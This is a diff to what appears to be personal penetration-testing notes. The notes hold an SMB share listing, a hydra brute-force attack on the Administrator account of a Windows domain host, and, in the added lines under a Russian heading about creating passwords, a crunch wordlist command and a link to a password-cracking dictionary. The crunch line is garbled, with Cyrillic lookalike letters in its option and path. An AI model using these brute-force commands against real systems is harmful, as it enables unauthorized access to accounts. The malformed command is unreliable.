@@ -43,3 +43,9 @@ smbclient -L 192.168.50.200 -U Administrator
 Brute char!!!! -x min:max:Aa1%
 
 hydra -x 7:8:1 -l administrator smb://192.168.50.200 -m "ROOT.DC" -V
+
+
+Создание паролей
+	crunch 6 8 1234567890 -о /гооt/wordlist.lst:
+
+https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
